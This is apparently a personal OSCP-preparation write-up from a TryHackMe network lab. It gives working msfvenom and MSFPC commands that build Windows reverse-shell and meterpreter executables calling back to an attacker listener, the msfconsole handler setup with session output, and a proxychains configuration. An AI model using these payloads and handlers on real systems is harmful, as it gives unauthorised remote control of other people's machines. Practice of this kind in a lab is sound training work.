# Yo Dawg, I heard you like proxies

Firstly to setup a meterpreter shell to then setup the proxychaining required for task I will use a tool I have seen in other github repositories about taking the OSCP. [MSFPC](https://github.com/g0tmi1k/msfpc). Install on a kali linux with:
```bash
apt install -y msfpc
```
or the THM AttackBox
```bash
curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/msfpc.sh" > /usr/local/bin/msfpc
chmod 0755 /usr/local/bin/msfpc
```
![msfpcsetup](Screenshots/msfpc.png)
Initially I tried:
```bash
root@ip-10-10-90-140:~# msfpc windows 10.10.90.140
 [*] MSFvenom Payload Creator (MSFPC v1.4.5)
 [i]   IP: 10.10.90.140
 [i] PORT: 443
 [i] TYPE: windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom -p windows/meterpreter/reverse_tcp -f exe \
  --platform windows -a x86 -e generic/none LHOST=10.10.90.140 LPORT=443 \
  > '/root/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] windows meterpreter created: '/root/windows-meterpreter-staged-reverse-tcp-443.exe'

 [i] MSF handler file: '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [i] Run: msfconsole -q -r '/root/windows-meterpreter-staged-reverse-tcp-443-exe.rc'
 [?] Quick web server (for file transfer)?: python3 -m http.server 8080
 [*] Done!
```

One thing I am surprised to learn is that it is only meterpreter payloads, which you are only allowed one of in the OSCP, but the otherwise its does awesome automation on a typing intensive task. It solves what its sets out to do and extends user capabilities. I have heard of g0tmi1k from privesc blogs, which are a extremely informative resource.

I then realised while building my [Archive](https://github.com/7RU7H/Archive) Metasploit section that I would need to further configure the LHOST address on the payload because of the Throwback using the inet address so as cool as that tool is, I'll just go it the manual way, but happy that there is a simple automated option.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.50.96.34 LPORT=4444
```

Re-wget-ed the shell.exe and setup msfconsole multi/hander to listen for the connection back. Start a listener, set payload, configure options, bang head off the keys: E X P L O I T
```msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp # corrected this to add x64
set LHOST $LISTENING-IP
set LPORT $LISTENING-PORT
exploit
```

![msfhandler](Screenshots/ydp-metersetup.png)
The output:
```msfconsole
[*] Started reverse TCP handler on 10.50.96.34:4444 
[*] Sending stage (176195 bytes) to 10.200.102.219
[*] 10.200.102.219 - Meterpreter session 1 closed.  Reason: Died
[*] Meterpreter session 1 opened (10.50.96.34:4444 -> 10.200.102.219:50774) at 2022-04-20 20:47:43
```
So I tried regular shell not meterpreter:
```bash
root@ip-10-10-90-140:~#  msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.50.96.34 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```
Configured the handler:
```msfconsole
# changed the payload
msf5 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
```
Also downloaded it to `Windows\TEMP` for the global writablity the directory offers, just in case. It hung on this:
```msfconsole
[*] Started reverse TCP handler on 10.50.96.34:4444 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.200.102.219
[*] Command shell session 6 opened (10.50.96.34:4444 -> 10.200.102.219:51027) at 2022-04-20 21:01:59 +0100

msf5 exploit(multi/handler) > sessions -i 6
[*] Starting interaction with 6...

[*] 10.200.102.219 - Command shell session 6 closed.
```

Went back and realised that the previous usage of any msfvenom payload required a tun0 connection:
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe`

[meterSUCCESS](Screenshots/yd-meter-success.png)

Now we can continue with the task. Big take away from this is the wonder of pre-setup and ironning out ANY network or system configuration many months before an exam. Also that the troubleshooting and networking I learnt from the pk100 was so helpful in both mindset and in knowledge to solve these problems. Better solve then once or twice now than later.

[meterSUCCESS](Screenshots/yd-autoroute-setup.png)

Configure the /etc/proxychains.conf

```vim
#socks4         127.0.0.1 9050
socks4 127.0.0.1 1080
```
